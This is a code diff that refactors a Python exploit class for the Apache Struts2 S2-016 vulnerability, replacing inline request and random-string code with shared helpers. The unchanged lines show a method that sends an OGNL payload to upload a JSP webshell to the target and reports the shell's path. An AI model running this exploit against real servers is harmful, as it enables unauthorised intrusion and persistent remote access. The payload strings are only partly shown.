@@ -10,20 +10,13 @@ import re
 import json
 import time
 import urllib
-import string
-import random
-import requests
-from urllib import request, parse
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class S2_016_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta='' 
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words) 
+        self.capta = get_capta() 
         self.headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                    'Content-Type': "application/x-www-form-urlencoded",
@@ -48,7 +41,7 @@ class S2_016_BaseVerify:
                             """
     
     def get_pagecode(self, url):
-        req = requests.get(url = url, verify = False)
+        req = request.get(url = url)
         return req
 
     def upload_jspshell(self, url, path):
@@ -62,7 +55,7 @@ class S2_016_BaseVerify:
         payload += "),%23stm.getWriter().flush(),%23stm.getWriter().close()}"
         url += payload
         try:
-            req = requests.post(url, data = self.jsp_payload, headers = Headers, timeout = 10, allow_redirects = False, verify = False)
+            req = request.post(url, data = self.jsp_payload, headers = Headers)
             if req.text.find('<html') == -1:
                 print('上传webshell文件成功,webshell文件路径为:', self.url.split('/')[0] + '//' + self.url.split('/')[2] + '/test.jsp')
             else:
